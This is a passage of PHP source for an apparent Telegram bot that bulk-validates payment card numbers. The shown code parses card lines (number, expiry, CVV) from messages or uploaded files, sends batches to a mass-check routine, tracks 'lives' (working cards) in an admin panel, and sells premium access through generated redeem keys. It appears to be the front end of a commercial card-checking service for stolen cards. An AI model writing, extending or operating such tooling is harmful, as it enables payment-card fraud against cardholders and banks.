                foreach ($lines as $line) {
                    $line = trim($line);
                    if (empty($line)) continue;
                    
                    $card = parseCard($line);
                    if ($card) {
                        $cards[] = $card['full'];
                    }
                }
                
                sendMessage($chatId, "📁 File loaded: " . count($cards) . " cards");
            }
        }
        
        if (empty($cards)) {
            $cardsText = '';
            if ($update['message']['reply_to_message']) {
                $cardsText = $update['message']['reply_to_message']['text'];
            } else {
                $cardsText = $args;
            }
            
            if (!empty($cardsText)) {
                $lines = explode("\n", $cardsText);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (empty($line)) continue;
                    
                    $card = parseCard($line);
                    if ($card) {
                        $cards[] = $card['full'];
                    }
                }
            }
        }
        
        if (empty($cards)) {
            $text = "❌ <b>No valid cards!</b>\n\n";
            $text .= "📝 <b>Usage:</b>\n";
            $text .= "1. /mass\n4111111111111111|12|25|123\n\n";
            $text .= "2. Reply to message with cards\n\n";
            $text .= "3. Upload .txt file with cards";
            
            sendMessage($chatId, $text, $msgId);
            break;
        }
        
        $limit = $settings['mass_limit'] ?? 30;
        $total = count($cards);
        
        if ($total > $limit) {
            $cards = array_slice($cards, 0, $limit);
            sendMessage($chatId, "⚠️ Max $limit cards. First $limit will be checked.");
        }
        
        massCheck($cards, $userId, $chatId, $msgId);
        break;
    
    // ===== ADMIN =====
    case '/admin':
        if (!isAdmin($userId)) {
            sendMessage($chatId, "❌ Admin only!", $msgId);
            break;
        }
        
        $users = json_decode(file_get_contents($usersDB), true);
        $stats = json_decode(file_get_contents($statsDB), true);
        
        $totalChecks = 0;
        $totalLives = 0;
        foreach ($stats as $day => $s) {
            $totalChecks += $s['total'];
            $totalLives += $s['lives'];
        }
        
        $today = date('Y-m-d');
        $todayStats = $stats[$today] ?? ['total' => 0, 'lives' => 0];
        
        $text = "👑 <b>ADMIN PANEL</b>\n\n";
        $text .= "📊 <b>TODAY</b>\n";
        $text .= "• Checks: {$todayStats['total']}\n";
        $text .= "• Lives: {$todayStats['lives']}\n\n";
        $text .= "📈 <b>ALL TIME</b>\n";
        $text .= "• Checks: $totalChecks\n";
        $text .= "• Lives: $totalLives\n\n";
        $text .= "👥 <b>USERS</b>\n";
        $text .= "• Total: " . count($users) . "\n";
        $text .= "• Premium: " . count(array_filter($users, fn($u) => $u['plan'] == 'premium' && $u['expiry'] > time())) . "\n\n";
        $text .= "<b>Commands:</b>\n";
        $text .= "/genkey monthly 30 - Generate key\n";
        $text .= "/users - List users\n";
        $text .= "/broadcast [msg] - Send to all";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/genkey':
        if (!isAdmin($userId)) {
            sendMessage($chatId, "❌ Admin only!", $msgId);
            break;
        }
        
        $parts = explode(' ', $args);
        if (count($parts) < 2) {
            sendMessage($chatId, "❌ Use: /genkey [plan] [days]", $msgId);
            break;
        }
        
        $plan = $parts[0];
        $days = (int)$parts[1];
        
        $key = generateKey($plan, $days);
        
        $text = "🔑 <b>KEY GENERATED</b>\n\n";
        $text .= "Key: <code>$key</code>\n";
        $text .= "Plan: " . ucfirst($plan) . "\n";
        $text .= "Days: $days\n\n";
        $text .= "User can redeem with:\n/redeem $key";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    default:
        if ($message[0] == '/') {
            sendMessage($chatId, "❌ Unknown command. Use /cmds", $msgId);
        }
        break;
}
?>
